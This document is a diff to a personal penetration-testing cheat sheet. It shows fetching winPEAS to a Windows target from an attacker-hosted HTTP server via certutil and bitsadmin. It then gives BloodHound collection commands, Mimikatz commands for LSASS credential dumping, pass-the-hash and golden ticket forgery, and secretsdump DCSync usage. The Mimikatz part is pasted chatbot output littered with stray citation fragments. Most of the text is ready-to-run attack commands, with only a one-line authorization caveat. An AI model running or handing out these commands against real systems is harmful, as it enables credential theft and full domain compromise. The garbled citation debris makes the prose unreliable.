@@ -1,4 +1,4 @@
-How to serve winpeas
+How to serve WINPEAS
 
 From directory containing winpeas
 root@kali$ python3 -m http.server 80
@@ -10,3 +10,164 @@ certutil -urlcache -split -f http://<attacker-ip>/winPEASx64.exe winpeas.exe
 
 Works on older machines
 bitsadmin /transfer winpeastask /download /priority high http://<attacker-ip>/winPEASx64.exe C:\Users\Public\winpeas.exe
+
+BLOODHOUND
+
+bloodhound-python -u administrator -p 'P@ssw0rd!' -d example.local -c All -ns 192.168.1.100
+
+Parameters:
+
+-u: Username (e.g., user@domain.local)
+
+-p: Password
+
+-d: Domain name (e.g., domain.local)
+
+-c: Collection method (e.g., All, Group, LocalAdmin)
+
+-ns: Nameserver IP (usually the Domain Controller's IP)​
+
+🔐 Authentication Options
+bloodhound-python supports various authentication methods:​
+
+Password Authentication: Provide username and password with -u and -p.
+
+NTLM Hashes: Use the --hashes option with LM and NT hashes.
+
+bloodhound-python -u user -d domain.local --hashes <LMHASH>:<NTHASH> -c All -ns 192.168.1.100
+
+Kerberos Authentication: Use a Kerberos ticket with the -k option.
+
+bloodhound-python -u user -d domain.local -k -c All -ns 192.168.1.100
+
+Ensure you have a valid Kerberos ticket in your cache when using the -k option.​
+GitHub
+
+MIMIKATZ
+
+🔑 Key Features of Mimikatz
+Credential Dumping: Extracts plaintext passwords, NTLM hashes, and Kerberos tickets directly from memory.​
+akbarkhan.hashnode.dev
+
+Pass-the-Hash (PtH): Allows authentication using NTLM hashes without knowing the actual password.​
+
+Pass-the-Ticket (PtT): Enables the use of Kerberos tickets to authenticate to services.​
+TheSecMaster
+
+Over-Pass-the-Hash: Combines PtH and PtT by injecting a Kerberos ticket derived from an NTLM hash.​
+StationX
++1
+TheSecMaster
++1
+
+Golden/Silver Ticket Attacks: Creates forged Kerberos tickets for persistent access.​
+TheSecMaster
++3
+Kyser Clark
++3
+MEFMobile
++3
+
+LSA Secrets Dumping: Retrieves stored credentials and secrets from the Local Security Authority (LSA).​
+Windows OS Hub
++3
+Byte Goblin
++3
+StationX
++3
+
+Windows Vault Access: Extracts credentials stored in the Windows Credential Vault.​
+Varonis
++4
+akbarkhan.hashnode.dev
++4
+HADESS
++4
+
+🛠️ Installing Mimikatz
+Download: Clone the official repository:​
+
+bash
+Copy
+Edit
+git clone https://github.com/gentilkiwi/mimikatz.git
+Transfer to Target: Set up a simple HTTP server on your Kali machine to transfer Mimikatz to the target:​
+Undercode Testing
+
+bash
+Copy
+Edit
+python3 -m http.server 80
+Execution: On the target Windows machine, download and run Mimikatz with administrative privileges.​
+
+🔧 Common Usage Commands
+Enable Debug Privileges: Required for many Mimikatz operations.​
+
+privilege::debug
+Dump Credentials from Memory: Extracts logon credentials from LSASS.​
+
+
+sekurlsa::logonpasswords
+Pass-the-Hash Attack: Authenticates using an NTLM hash.​
+
+plaintext
+Copy
+Edit
+sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLM_HASH
+Dump LSA Secrets: Retrieves stored secrets like service account passwords.​
+
+plaintext
+Copy
+Edit
+lsadump::secrets
+Extract Kerberos Tickets: Lists available Kerberos tickets.​
+UMA Technology
++6
+MEFMobile
++6
+akbarkhan.hashnode.dev
++6
+
+plaintext
+Copy
+Edit
+kerberos::list
+Create a Golden Ticket: Generates a forged Kerberos ticket for persistent access.​
+
+plaintext
+Copy
+Edit
+kerberos::golden /user:USERNAME /domain:DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /id:USER_ID
+⚠️ Considerations and Best Practices
+Administrative Privileges: Mimikatz requires elevated privileges to function correctly.​
+
+Antivirus Detection: Many antivirus solutions flag Mimikatz as malicious. Use in controlled environments.​
+MEFMobile
+
+Ethical Use: Always ensure you have proper authorization before using Mimikatz on any system.
+
+
+
+
+Use exploited creds on services.
+
+
+
+
+
+
+
+SECRETSDUMP.PY
+
+dumps secrets on domain services
+
+python3 secretsdump.py DOMAIN/username:password@target_ip
+
+for hashes
+
+python3 secretsdump.py DOMAIN/username@target_ip -hashes LMHASH:NTHASH
+
+for dcsync
+
+python3 secretsdump.py DOMAIN/username:password@dc_ip -just-dc
+
